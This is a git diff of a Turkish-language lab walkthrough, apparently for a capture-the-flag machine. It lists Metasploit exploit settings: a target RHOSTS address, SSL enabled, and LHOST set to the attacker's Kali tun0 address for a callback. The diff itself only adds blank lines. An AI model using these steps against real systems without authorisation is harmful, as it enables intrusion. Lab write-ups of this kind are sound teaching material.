@@ -48,8 +48,12 @@ Bulduğum bu exploiti kullanmak için exploit sırasını şeçmem gerekli bunun
 ![Screenshot_3](https://user-images.githubusercontent.com/34964480/90020879-2077bd00-dcb9-11ea-8745-ed7c0d3258c2.png)
 
 Sırasıyla ;
+
             1 - ```set RHOSTS <buraya hedef ip adresi > ``` bizimki bu şekilde ``` set RHOSTS 10.10.90.55 ```
+            
             2 - ```set SSL true ```
+            
             3 - ```set LHOST <buraya kali tun0 ip adresi > <bunun sudo ifconfig komutu ile görebiliriz> ```
+            
             
 
